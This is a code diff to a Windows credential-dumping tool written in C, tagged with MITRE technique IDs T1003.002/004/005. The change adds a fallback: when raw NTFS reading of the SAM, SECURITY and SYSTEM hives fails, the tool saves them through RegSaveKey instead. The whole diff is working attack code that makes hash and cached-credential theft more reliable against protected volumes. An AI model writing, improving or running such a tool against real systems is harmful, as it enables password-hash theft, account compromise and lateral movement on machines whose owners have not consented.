@@ -212,37 +212,49 @@ static BOOL FallbackSaveHives(HIVE_DATA* sam, HIVE_DATA* sec, HIVE_DATA* sys) {
 int wmain(void) {
     wprintf(L"[*] SAM+LSA+MSCache Dump — T1003.002/004/005\n");
 
-    // 1. Open raw NTFS volume
+    // 1. Open raw NTFS volume (raw NTFS may be unavailable: BitLocker, ReFS...)
     wprintf(L"[1] Opening \\\\.\\C:... ");
     HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
         FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
         FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, NULL);
     if (hVol == INVALID_HANDLE_VALUE) { wprintf(L"FAILED\n"); return 1; }
 
-    NTFS_CONTEXT ctx;
-    if (!ParseNtfsBoot(hVol, &ctx)) { wprintf(L"Not NTFS\n"); CloseHandle(hVol); return 1; }
-    wprintf(L"OK (cluster=%d)\n", ctx.clusterSize);
-
-    // 2. Read MFT
-    wprintf(L"[2] Reading MFT... ");
-    PBYTE mft = NULL; SIZE_T mftSz = 0;
-    if (!ReadMft(hVol, &ctx, &mft, &mftSz)) { CloseHandle(hVol); return 1; }
-    wprintf(L"OK (%lld MB)\n", mftSz / 1024 / 1024);
-
-    // 3. Extract hives (raw NTFS first, RegSaveKey fallback)
-    wprintf(L"[3] Extracting SAM/SECURITY/SYSTEM... ");
     HIVE_DATA sam = {0}, sec = {0}, sys = {0};
-    BOOL s1 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
-        L"\\Windows\\System32\\config\\SAM", &sam);
-    BOOL s2 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
-        L"\\Windows\\System32\\config\\SECURITY", &sec);
-    BOOL s3 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
-        L"\\Windows\\System32\\config\\SYSTEM", &sys);
-    CloseHandle(hVol); VirtualFree(mft, 0, MEM_RELEASE);
-    wprintf(L"%s/%s/%s (%lld/%lld/%lld bytes)\n",
-        s1?L"SAM":L"FAIL", s2?L"SEC":L"FAIL", s3?L"SYS":L"FAIL",
-        sam.size, sec.size, sys.size);
-    if (!s1 || !s3) {
+    BOOL s1 = FALSE, s2 = FALSE, s3 = FALSE;
+    BOOL rawOk = FALSE;
+
+    NTFS_CONTEXT ctx;
+    if (ParseNtfsBoot(hVol, &ctx)) {
+        wprintf(L"OK (cluster=%d)\n", ctx.clusterSize);
+
+        // 2. Read MFT
+        wprintf(L"[2] Reading MFT... ");
+        PBYTE mft = NULL; SIZE_T mftSz = 0;
+        if (ReadMft(hVol, &ctx, &mft, &mftSz)) {
+            wprintf(L"OK (%lld MB)\n", mftSz / 1024 / 1024);
+
+            // 3. Extract hives
+            wprintf(L"[3] Extracting SAM/SECURITY/SYSTEM... ");
+            s1 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
+                L"\\Windows\\System32\\config\\SAM", &sam);
+            s2 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
+                L"\\Windows\\System32\\config\\SECURITY", &sec);
+            s3 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
+                L"\\Windows\\System32\\config\\SYSTEM", &sys);
+            VirtualFree(mft, 0, MEM_RELEASE);
+            wprintf(L"%s/%s/%s (%lld/%lld/%lld bytes)\n",
+                s1?L"SAM":L"FAIL", s2?L"SEC":L"FAIL", s3?L"SYS":L"FAIL",
+                sam.size, sec.size, sys.size);
+            rawOk = s1 && s3;
+        } else {
+            wprintf(L"FAILED\n");
+        }
+    } else {
+        wprintf(L"Not NTFS\n");
+    }
+    CloseHandle(hVol);
+
+    if (!rawOk) {
         wprintf(L"      [i] Raw NTFS failed — falling back to RegSaveKey (backup privilege)...\n");
         FreeHiveData(&sam); FreeHiveData(&sec); FreeHiveData(&sys);
         if (!FallbackSaveHives(&sam, &sec, &sys)) {
